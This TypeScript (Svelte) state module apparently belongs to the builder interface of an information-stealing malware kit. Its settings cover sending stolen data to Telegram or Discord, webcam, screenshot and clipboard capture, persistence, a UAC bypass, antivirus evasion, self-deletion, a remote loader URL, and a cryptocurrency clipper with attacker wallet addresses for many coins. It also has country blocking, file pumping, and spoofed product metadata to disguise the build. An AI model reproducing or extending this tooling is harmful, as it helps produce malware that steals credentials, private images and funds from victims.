import { categories } from "./data/categories";

export function createBuilderState() {
  let archivePassword = $state("");
  let encryptArtifacts = $state(false);
  let telegramToken = $state("");
  let telegramChatId = $state("");
  let discordWebhook = $state("");
  let commMode = $state<"telegram" | "discord">("telegram");
  let outputDir = $state("");
  let iconSource = $state("");
  let iconPreset = $state("none");
  let productName = $state("");
  let fileDescription = $state("");
  let companyName = $state("");
  let productVersion = $state("");
  let fileVersion = $state("");
  let copyright = $state("");
  let categoryState = $state<Record<string, boolean>>(
    Object.fromEntries(categories.map((category) => [category.id, true])),
  );
  let captureScreenshots = $state(true);
  let captureWebcams = $state(true);
  let captureClipboard = $state(true);
  let persistence = $state(false);
  let uacBypass = $state(false);
  let evasion = $state(true);
  let clipper = $state(false);
  let standalone = $state(false);
  let melt = $state(true);
  let debug = $state(false);
  let loaderUrl = $state("");
  let proxyServer = $state("");
  let btcAddress = $state("");
  let ethAddress = $state("");
  let ltcAddress = $state("");
  let xmrAddress = $state("");
  let dogeAddress = $state("");
  let dashAddress = $state("");
  let solAddress = $state("");
  let trxAddress = $state("");
  let adaAddress = $state("");
  let blockedCountries = $state<string[]>([]);
  let pumpSize = $state(0);
  let pumpUnit = $state<"kb" | "mb" | "gb">("mb");
  let customExtensions = $state<string[]>([]);
  let customKeywords = $state<string[]>([]);
  let pwdLength = $state(20);
  let pwdUppercase = $state(true);
  let pwdNumbers = $state(true);
  let pwdSymbols = $state(true);
  let buildStatus = $state<"idle" | "loading" | "success" | "error">("idle");
  let buildError = $state("");
  let movedTo = $state("");
  let isOpenBranding = $state(false);
  let showEvasionWarning = $state(false);

  // Validation derived states
  const selectedCategories = $derived(
    categories
      .filter((category) => categoryState[category.id])
      .map((category) => category.id)
  );

  const selectedCategoryCount = $derived(selectedCategories.length);

  return {
    // State
    get archivePassword() { return archivePassword; },
    set archivePassword(v) { archivePassword = v; },
    get encryptArtifacts() { return encryptArtifacts; },
    set encryptArtifacts(v) { encryptArtifacts = v; },
    get telegramToken() { return telegramToken; },
    set telegramToken(v) { telegramToken = v; },
    get telegramChatId() { return telegramChatId; },
    set telegramChatId(v) { telegramChatId = v; },
    get discordWebhook() { return discordWebhook; },
    set discordWebhook(v) { discordWebhook = v; },
    get commMode() { return commMode; },
    set commMode(v) { commMode = v; },
    get outputDir() { return outputDir; },
    set outputDir(v) { outputDir = v; },
    get iconSource() { return iconSource; },
    set iconSource(v) { iconSource = v; },
    get iconPreset() { return iconPreset; },
    set iconPreset(v) { iconPreset = v; },
    get productName() { return productName; },
    set productName(v) { productName = v; },
    get fileDescription() { return fileDescription; },
    set fileDescription(v) { fileDescription = v; },
    get companyName() { return companyName; },
    set companyName(v) { companyName = v; },
    get productVersion() { return productVersion; },
    set productVersion(v) { productVersion = v; },
    get fileVersion() { return fileVersion; },
    set fileVersion(v) { fileVersion = v; },
    get copyright() { return copyright; },
    set copyright(v) { copyright = v; },
    get categoryState() { return categoryState; },
    set categoryState(v) { categoryState = v; },
    get captureScreenshots() { return captureScreenshots; },
    set captureScreenshots(v) { captureScreenshots = v; },
    get captureWebcams() { return captureWebcams; },
    set captureWebcams(v) { captureWebcams = v; },
    get captureClipboard() { return captureClipboard; },
    set captureClipboard(v) { captureClipboard = v; },
    get persistence() { return persistence; },
    set persistence(v) { persistence = v; },
    get uacBypass() { return uacBypass; },
    set uacBypass(v) { uacBypass = v; },
    get evasion() { return evasion; },
    set evasion(v) { evasion = v; },
    get clipper() { return clipper; },
    set clipper(v) { clipper = v; },
    get standalone() { return standalone; },
    set standalone(v) { standalone = v; },
    get melt() { return melt; },
    set melt(v) { melt = v; },
    get debug() { return debug; },
    set debug(v) { debug = v; },
    get loaderUrl() { return loaderUrl; },
    set loaderUrl(v) { loaderUrl = v; },
    get proxyServer() { return proxyServer; },
    set proxyServer(v) { proxyServer = v; },
    get btcAddress() { return btcAddress; },
    set btcAddress(v) { btcAddress = v; },
    get ethAddress() { return ethAddress; },
    set ethAddress(v) { ethAddress = v; },
    get ltcAddress() { return ltcAddress; },
    set ltcAddress(v) { ltcAddress = v; },
    get xmrAddress() { return xmrAddress; },
    set xmrAddress(v) { xmrAddress = v; },
    get dogeAddress() { return dogeAddress; },
    set dogeAddress(v) { dogeAddress = v; },
    get dashAddress() { return dashAddress; },
    set dashAddress(v) { dashAddress = v; },
    get solAddress() { return solAddress; },
    set solAddress(v) { solAddress = v; },
    get trxAddress() { return trxAddress; },
    set trxAddress(v) { trxAddress = v; },
    get adaAddress() { return adaAddress; },
    set adaAddress(v) { adaAddress = v; },
    get blockedCountries() { return blockedCountries; },
    set blockedCountries(v) { blockedCountries = v; },
    get pumpSize() { return pumpSize; },
    set pumpSize(v) { pumpSize = v; },
    get pumpUnit() { return pumpUnit; },
    set pumpUnit(v) { pumpUnit = v; },
    get customExtensions() { return customExtensions; },
    set customExtensions(v) { customExtensions = v; },
    get customKeywords() { return customKeywords; },
    set customKeywords(v) { customKeywords = v; },
    get pwdLength() { return pwdLength; },
    set pwdLength(v) { pwdLength = v; },
    get pwdUppercase() { return pwdUppercase; },
    set pwdUppercase(v) { pwdUppercase = v; },
    get pwdNumbers() { return pwdNumbers; },
    set pwdNumbers(v) { pwdNumbers = v; },
    get pwdSymbols() { return pwdSymbols; },
    set pwdSymbols(v) { pwdSymbols = v; },
    get buildStatus() { return buildStatus; },
    set buildStatus(v) { buildStatus = v; },
    get buildError() { return buildError; },
    set buildError(v) { buildError = v; },
    get movedTo() { return movedTo; },
    set movedTo(v) { movedTo = v; },
    get isOpenBranding() { return isOpenBranding; },
    set isOpenBranding(v) { isOpenBranding = v; },
    get showEvasionWarning() { return showEvasionWarning; },
    set showEvasionWarning(v) { showEvasionWarning = v; },

    // Derived
    get selectedCategories() { return selectedCategories; },
    get selectedCategoryCount() { return selectedCategoryCount; },
  };
}

export const builderState = createBuilderState();
